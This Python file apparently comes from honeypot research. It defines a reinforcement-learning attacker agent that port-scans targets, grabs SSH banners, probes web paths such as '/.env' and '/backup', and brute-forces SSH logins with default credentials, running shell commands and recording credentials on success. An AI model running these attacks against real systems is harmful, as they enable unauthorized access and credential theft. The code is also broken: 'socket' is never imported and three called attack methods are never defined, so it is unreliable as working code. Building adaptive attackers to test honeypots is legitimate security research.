import numpy as np
import torch
import torch.nn as nn
import torch.optim as optim
import random
import paramiko
import requests
import time
from collections import deque

class AdversarialAttacker:
    """
    Adversarial RL agent that learns to attack honeypots
    Replaces scripted attacker with adaptive learning opponent
    """
    def __init__(self, state_size=4, action_size=6, learning_rate=0.001):
        self.state_size = state_size  # [honeypot_type, response_time, success_rate, detection_risk]
        self.action_size = action_size  # [ssh_bruteforce, web_scan, port_scan, exploit_attempt, reconnaissance, wait]
        self.memory = deque(maxlen=2000)
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.995
        self.learning_rate = learning_rate
        
        # Neural network for Q-learning
        self.q_network = self._build_model()
        self.target_network = self._build_model()
        self.optimizer = optim.Adam(self.q_network.parameters(), lr=learning_rate)
        
        # Attack statistics
        self.attack_history = []
        self.success_count = 0
        self.detection_count = 0
        
    def _build_model(self):
        """Build neural network for adversarial learning"""
        model = nn.Sequential(
            nn.Linear(self.state_size, 64),
            nn.ReLU(),
            nn.Linear(64, 64),
            nn.ReLU(),
            nn.Linear(64, self.action_size)
        )
        return model
        
    def get_state(self, target_host, honeypot_type):
        """Observe current environment state"""
        # Real reconnaissance of target
        response_time = self._measure_response_time(target_host)
        open_ports = self._scan_ports(target_host)
        service_fingerprint = self._fingerprint_services(target_host, open_ports)
        
        # Encode state for RL agent
        state = np.array([
            honeypot_type,  # 0=none, 1=ssh, 2=web
            response_time,
            len(open_ports),
            self._calculate_detection_risk()
        ])
        
        return state
        
    def _measure_response_time(self, host):
        """Measure actual network response time"""
        try:
            start = time.time()
            response = requests.get(f"http://{host}", timeout=5)
            return time.time() - start
        except:
            return 5.0  # Timeout
            
    def _scan_ports(self, host):
        """Real port scanning"""
        open_ports = []
        common_ports = [22, 80, 443, 2222, 8080]
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
                
        return open_ports
        
    def _fingerprint_services(self, host, ports):
        """Service fingerprinting"""
        services = {}
        for port in ports:
            try:
                if port == 22 or port == 2222:
                    # SSH banner grabbing
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    banner = sock.recv(1024).decode().strip()
                    services[port] = banner
                    sock.close()
            except:
                pass
        return services
        
    def _calculate_detection_risk(self):
        """Estimate detection risk based on recent activity"""
        recent_attacks = len([a for a in self.attack_history[-10:] if a['detected']])
        return min(recent_attacks / 10.0, 1.0)
        
    def choose_action(self, state):
        """Choose attack action using epsilon-greedy policy"""
        if np.random.random() <= self.epsilon:
            return random.randrange(self.action_size)
        
        state_tensor = torch.FloatTensor(state).unsqueeze(0)
        q_values = self.q_network(state_tensor)
        return np.argmax(q_values.cpu().data.numpy())
        
    def execute_attack(self, action, target_host):
        """Execute real attack based on chosen action"""
        attack_result = {
            'action': action,
            'timestamp': time.time(),
            'success': False,
            'detected': False,
            'data_collected': None
        }
        
        try:
            if action == 0:  # SSH brute force
                attack_result = self._ssh_bruteforce(target_host)
            elif action == 1:  # Web scanning
                attack_result = self._web_scan(target_host)
            elif action == 2:  # Port scanning
                attack_result = self._port_scan(target_host)
            elif action == 3:  # Exploit attempt
                attack_result = self._exploit_attempt(target_host)
            elif action == 4:  # Reconnaissance
                attack_result = self._reconnaissance(target_host)
            elif action == 5:  # Wait/observe
                time.sleep(random.uniform(5, 15))
                attack_result['success'] = True
                
        except Exception as e:
            attack_result['error'] = str(e)
            
        self.attack_history.append(attack_result)
        return attack_result
        
    def _ssh_bruteforce(self, host):
        """Real SSH brute force attack"""
        passwords = ['admin', 'password', '123456', 'root', 'ubuntu']
        usernames = ['root', 'admin', 'ubuntu']
        
        for username in usernames:
            for password in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=2222, username=username, password=password, timeout=5)
                    
                    # If successful, collect information
                    stdin, stdout, stderr = ssh.exec_command('whoami; pwd; ls -la')
                    output = stdout.read().decode()
                    ssh.close()
                    
                    return {
                        'action': 0,
                        'success': True,
                        'detected': True,  # Successful login is always detected
                        'data_collected': output,
                        'credentials': f"{username}:{password}"
                    }
                    
                except paramiko.AuthenticationException:
                    continue  # Expected for honeypot
                except Exception:
                    break
                    
        return {'action': 0, 'success': False, 'detected': True}
        
    def _web_scan(self, host):
        """Web vulnerability scanning"""
        paths = ['/admin', '/login', '/config', '/backup', '/.env', '/robots.txt']
        findings = []
        
        for path in paths:
            try:
                response = requests.get(f"http://{host}{path}", timeout=5)
                if response.status_code == 200:
                    findings.append({
                        'path': path,
                        'status': response.status_code,
                        'content_length': len(response.content)
                    })
            except:
                continue
                
        return {
            'action': 1,
            'success': len(findings) > 0,
            'detected': len(findings) > 2,  # Multiple requests likely detected
            'data_collected': findings
        }
        
    def learn(self, state, action, reward, next_state, done):
        """Update Q-network based on experience"""
        self.memory.append((state, action, reward, next_state, done))
        
        if len(self.memory) > 32:
            self._replay(32)
            
        if self.epsilon > self.epsilon_min:
            self.epsilon *= self.epsilon_decay
            
    def _replay(self, batch_size):
        """Experience replay for learning"""
        batch = random.sample(self.memory, batch_size)
        states = torch.FloatTensor([e[0] for e in batch])
        actions = torch.LongTensor([e[1] for e in batch])
        rewards = torch.FloatTensor([e[2] for e in batch])
        next_states = torch.FloatTensor([e[3] for e in batch])
        dones = torch.BoolTensor([e[4] for e in batch])
        
        current_q_values = self.q_network(states).gather(1, actions.unsqueeze(1))
        next_q_values = self.target_network(next_states).max(1)[0].detach()
        target_q_values = rewards + (0.99 * next_q_values * ~dones)
        
        loss = nn.MSELoss()(current_q_values.squeeze(), target_q_values)
        
        self.optimizer.zero_grad()
        loss.backward()
        self.optimizer.step()
        
    def update_target_network(self):
        """Update target network"""
        self.target_network.load_state_dict(self.q_network.state_dict())
        
    def get_performance_metrics(self):
        """Get attacker performance statistics"""
        if not self.attack_history:
            return {}
            
        total_attacks = len(self.attack_history)
        successful_attacks = sum(1 for a in self.attack_history if a.get('success', False))
        detected_attacks = sum(1 for a in self.attack_history if a.get('detected', False))
        
        return {
            'total_attacks': total_attacks,
            'success_rate': successful_attacks / total_attacks,
            'detection_rate': detected_attacks / total_attacks,
            'learning_progress': 1.0 - self.epsilon,
            'attack_diversity': len(set(a['action'] for a in self.attack_history[-20:]))
        }